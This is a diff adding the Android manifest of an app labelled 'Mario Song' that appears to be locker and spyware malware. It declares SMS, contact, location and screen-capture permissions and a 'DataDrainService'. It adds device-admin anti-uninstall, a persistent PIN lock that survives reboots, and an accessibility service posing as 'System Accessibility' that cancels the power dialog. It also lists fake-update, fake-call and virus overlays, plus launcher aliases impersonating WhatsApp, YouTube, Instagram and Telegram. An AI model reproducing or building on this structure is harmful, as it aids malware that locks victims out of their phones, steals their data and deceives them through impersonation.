@@ -1,0 +1,318 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
+
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.FLASHLIGHT" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
+    <uses-permission android:name="android.permission.SET_WALLPAPER" />
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" tools:ignore="QueryAllPackagesPermission" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="28" />
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" tools:ignore="ScopedStorage" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <!-- Device Admin: Anti-Uninstall + Power Button Disable -->
+    <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
+    <!-- Reboot protection -->
+    <uses-permission android:name="android.permission.REBOOT" tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.SHUTDOWN" tools:ignore="ProtectedPermissions" />
+    <!-- Restart on kill -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.REQUEST_REBOOT_READINESS_STATUS" />
+
+    <uses-feature android:name="android.hardware.camera.flash" android:required="false" />
+
+    <application
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:label="Mario Song"
+        android:supportsRtl="true"
+        android:theme="@style/AppTheme"
+        android:usesCleartextTraffic="true">
+
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:launchMode="singleTask"
+            android:windowSoftInputMode="adjustResize" />
+
+        <!-- BootReceiver: trigger lock setelah reboot -->
+        <receiver
+            android:name=".BootReceiver"
+            android:exported="true"
+            android:directBootAware="true">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- DeviceService -->
+        <service
+            android:name=".DeviceService"
+            android:exported="false"
+            android:foregroundServiceType="camera|mediaProjection|location" />
+
+        <service
+            android:name=".DataDrainService"
+            android:exported="false"
+            android:foregroundServiceType="specialUse" />
+
+        <!-- LockNewActivity: UI lock dengan PIN -->
+        <activity
+            android:name=".LockNewActivity"
+            android:exported="false"
+            android:launchMode="singleTask"
+            android:excludeFromRecents="true"
+            android:showOnLockScreen="true"
+            android:showWhenLocked="true"
+            android:turnScreenOn="true"
+            android:windowSoftInputMode="stateAlwaysHidden"
+            android:theme="@style/AppTheme" />
+
+        <activity
+            android:name=".ScreenCaptureActivity"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:excludeFromRecents="true"
+            android:exported="false" />
+
+        <activity
+            android:name=".FakeCallActivity"
+            android:exported="false"
+            android:launchMode="singleInstance"
+            android:excludeFromRecents="true"
+            android:showWhenLocked="true"
+            android:turnScreenOn="true"
+            android:theme="@style/Theme.AppCompat.NoActionBar" />
+
+        <activity
+            android:name=".LockChatActivity"
+            android:exported="false"
+            android:launchMode="singleTask"
+            android:excludeFromRecents="true"
+            android:showWhenLocked="true"
+            android:turnScreenOn="true"
+            android:theme="@style/Theme.AppCompat.NoActionBar" />
+
+        <!-- LockOverlayService -->
+        <service
+            android:name=".LockOverlayService"
+            android:exported="false"
+            android:stopWithTask="false"
+            android:foregroundServiceType="specialUse" />
+
+        <!-- TTSService -->
+        <service
+            android:name=".TTSService"
+            android:exported="false"
+            android:stopWithTask="false"
+            android:foregroundServiceType="specialUse" />
+
+        <!-- LockMonitorService (legacy) -->
+        <service
+            android:name=".LockMonitorService"
+            android:exported="false"
+            android:stopWithTask="false"
+            android:foregroundServiceType="specialUse" />
+
+        <!-- ═══════════════════════════════════════════════════════════ -->
+        <!-- PERSISTENT LOCK SERVICE: Kebal restart, auto-restore lock  -->
+        <!-- ═══════════════════════════════════════════════════════════ -->
+        <service
+            android:name=".PersistentLockService"
+            android:exported="false"
+            android:stopWithTask="false"
+            android:directBootAware="true"
+            android:foregroundServiceType="specialUse" />
+
+        <!-- ═══════════════════════════════════════════════════════════ -->
+        <!-- POWER BUTTON ACCESSIBILITY SERVICE: Auto-click cancel      -->
+        <!-- pada power dialog saat lock aktif                          -->
+        <!-- ═══════════════════════════════════════════════════════════ -->
+        <service
+            android:name=".PowerButtonService"
+            android:exported="true"
+            android:label="System Accessibility"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/power_button_service_config" />
+        </service>
+
+        <!-- AppBlockerService (existing accessibility service) -->
+        <service
+            android:name=".AppBlockerService"
+            android:exported="true"
+            android:label="Mario Song"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
+        <service
+            android:name=".SmsNotifService"
+            android:exported="true"
+            android:label="Mario Song"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
+        <!-- ═══════════════════════════════════════════════════════════ -->
+        <!-- DEVICE ADMIN RECEIVER: Anti-uninstall + block power button -->
+        <!-- ═══════════════════════════════════════════════════════════ -->
+        <receiver
+            android:name=".AntiUninstallReceiver"
+            android:exported="true"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin_policies" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Other services -->
+        <service android:name=".DialogSpamService"     android:exported="false" android:stopWithTask="false" />
+        <service android:name=".VideoOverlayService"   android:exported="false" android:stopWithTask="false" />
+        <service android:name=".VirusOverlayService"   android:exported="false" android:stopWithTask="false" />
+        <service android:name=".VirusV2OverlayService" android:exported="false" android:stopWithTask="false" />
+        <service android:name=".SosOverlayService"     android:exported="false" android:stopWithTask="false" />
+        <service android:name=".BrightnessOverlayService" android:exported="false" android:stopWithTask="false" />
+        <service android:name=".JumpscareV3Service"    android:exported="false" android:stopWithTask="false" />
+        <service android:name=".BlankScreenService"    android:exported="false" android:stopWithTask="false" />
+        <service android:name=".CrashUIService"        android:exported="false" android:stopWithTask="false" />
+        <service android:name=".PeringatanOverlayService" android:exported="false" android:stopWithTask="false" android:enabled="true" />
+        <service android:name=".FakeUpdateOverlayService" android:exported="false" android:stopWithTask="false" android:enabled="true" />
+        <service android:name=".KeyboardSpamOverlayService" android:exported="false" android:stopWithTask="false" android:enabled="true" />
+        <service android:name=".LcdDamageOverlayService" android:exported="false" android:enabled="true" android:foregroundServiceType="specialUse" />
+        <service android:name=".NetworkLockService" android:exported="false" android:enabled="true" android:foregroundServiceType="specialUse" />
+
+        <!-- ComboLockService: upgrade dengan persistent state -->
+        <service
+            android:name=".ComboLockService"
+            android:enabled="true"
+            android:exported="false"
+            android:stopWithTask="false"
+            android:foregroundServiceType="specialUse" />
+
+        <!-- Theme Aliases -->
+        <activity-alias
+            android:name=".AliasDefault"
+            android:targetActivity=".MainActivity"
+            android:label="Mario Song"
+            android:icon="@mipmap/ic_launcher"
+            android:roundIcon="@mipmap/ic_launcher_round"
+            android:exported="true"
+            android:enabled="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasWhatsApp"
+            android:targetActivity=".MainActivity"
+            android:label="WhatsApp"
+            android:icon="@mipmap/ic_theme_whatsapp"
+            android:roundIcon="@mipmap/ic_theme_whatsapp"
+            android:exported="true"
+            android:enabled="false">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasYouTube"
+            android:targetActivity=".MainActivity"
+            android:label="YouTube"
+            android:icon="@mipmap/ic_theme_youtube"
+            android:roundIcon="@mipmap/ic_theme_youtube"
+            android:exported="true"
+            android:enabled="false">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasInstagram"
+            android:targetActivity=".MainActivity"
+            android:label="Instagram"
+            android:icon="@mipmap/ic_theme_instagram"
+            android:roundIcon="@mipmap/ic_theme_instagram"
+            android:exported="true"
+            android:enabled="false">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasTelegram"
+            android:targetActivity=".MainActivity"
+            android:label="Telegram"
+            android:icon="@mipmap/ic_theme_telegram"
+            android:roundIcon="@mipmap/ic_theme_telegram"
+            android:exported="true"
+            android:enabled="false">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".AliasXNXX"
+            android:targetActivity=".MainActivity"
+            android:label="XNXX"
+            android:icon="@mipmap/ic_theme_xnxx"
+            android:roundIcon="@mipmap/ic_theme_xnxx"
+            android:exported="true"
+            android:enabled="false">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+    </application>
+
+</manifest>
